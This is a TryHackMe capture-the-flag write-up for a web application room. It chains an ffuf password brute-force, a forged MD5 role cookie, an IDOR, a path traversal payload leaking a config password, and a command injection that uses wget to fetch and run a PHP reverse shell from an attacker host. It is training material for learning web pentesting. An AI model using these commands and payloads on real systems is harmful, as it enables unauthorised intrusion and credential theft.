# TryHackMe — Support Room | Write-Up
**Difficulty:** Medium | **Category:** Web Application Pentesting

---

## Overview

This room covers a chain of web vulnerabilities: credential brute-forcing, cookie manipulation, IDOR (Insecure Direct Object Reference), path traversal / config file disclosure, and finally Remote Code Execution (RCE) via command injection.

---

## Step 1 — Reconnaissance & Email Discovery

After launching the machine and navigating to the web application, the landing page revealed a support email address:

```
help@support.thm
```

This gave us a valid username to target for login brute-forcing.

---

## Step 2 — Credential Brute-Force with ffuf

Using the discovered email as a fixed username (`W1`) and a common password wordlist for `W2`, the following ffuf command was crafted:

```bash
ffuf -w help@support.thm:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 \
  -X POST \
  -d "username=W1&password=W2" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -u http://10.112.188.198 \
  -fc 200
```

> `-fc 200` filters out HTTP 200 responses (failed logins), so only a different status code (e.g. 302 redirect) surfaces the hit.

✅ **Credentials found:**
```
Username: help@support.thm
Password: snoopy
```

---

## Step 3 — Cookie Manipulation (Privilege Escalation to Admin)

After logging in, inspecting the browser cookies revealed a suspicious value — an **MD5 hash**.

Cracking the hash (e.g. via CrackStation or hashcat) returned the plaintext:

```
false
```

The application was using this cookie to determine the user's role. Re-encoding the string `true` as MD5:

```
b326b5062b2f0e69046810717534cb09  ← MD5("true")
```

Replacing the cookie value with the MD5 of `"true"` and refreshing the page granted **admin-level access**.

> ⚠️ No flag was issued at this stage — more enumeration needed.

---

## Step 4 — IDOR via API Endpoint

Exploring the application revealed an API endpoint:

```
/user/3
```

By incrementing/decrementing the user ID (classic **IDOR** — Insecure Direct Object Reference), changing to `/user/1` exposed admin account data:

```
email: specialadmin@support.thm
```

Brute-forcing this new email with ffuf returned no results, so a different approach was needed.

---

## Step 5 — Path Traversal & Config File Disclosure

Further testing of application parameters revealed a vulnerable input. Passing a traversal payload:

```
sniks=..config
```

...returned the contents of a server-side **configuration file**, which contained the admin password:

```
support@110
```

However, attempting to log in with `specialadmin@support.thm` : `support@110` **failed** — the `@` symbol in the password was being interpreted incorrectly (likely URL-encoded or conflicting with the email field parser).

**Fix:** Remove the `@` symbol from the password:

```
Password: support110
```

✅ Login successful → **Admin Panel Flag obtained!**

---

## Step 6 — Remote Code Execution (RCE) via Command Injection

Using **Burp Suite** to intercept admin panel traffic, a suspicious parameter was identified:

```
sys=date
```

The value was passed directly to the system — a textbook **OS command injection** vulnerability.

**Exploitation plan:**
1. Set up a Python HTTP server to host a PHP reverse shell:
   ```bash
   python3 -m http.server 8000
   ```
2. Inject the payload via Burp Suite to download and execute the shell:
   ```
   sys=date | wget http://10.112.98.11:8000/shell.php | php shell.php
   ```

The server fetched `shell.php` from the attacker machine and executed it, delivering a **remote shell**.

✅ **Final Flag:**
```
THM{GOT_THE_FLAG001}
```

---

## Vulnerability Summary

| # | Vulnerability | Impact |
|---|---|---|
| 1 | Weak credentials (brute-forceable) | Initial access |
| 2 | MD5 cookie for role control | Privilege escalation |
| 3 | IDOR on `/user/{id}` | Sensitive data exposure |
| 4 | Path traversal in config param | Credential disclosure |
| 5 | OS command injection (`sys=`) | Full RCE |

---

## Key Takeaways

- **Never store role/privilege data client-side** (especially as a crackable hash).
- **IDOR** is simple to exploit but devastating — always validate ownership server-side.
- **Config files** should never be accessible via user-controlled input.
- **Special characters in passwords** can cause unexpected parsing bugs — test thoroughly.
- **User-controlled system commands** without sanitization = instant shell.

---

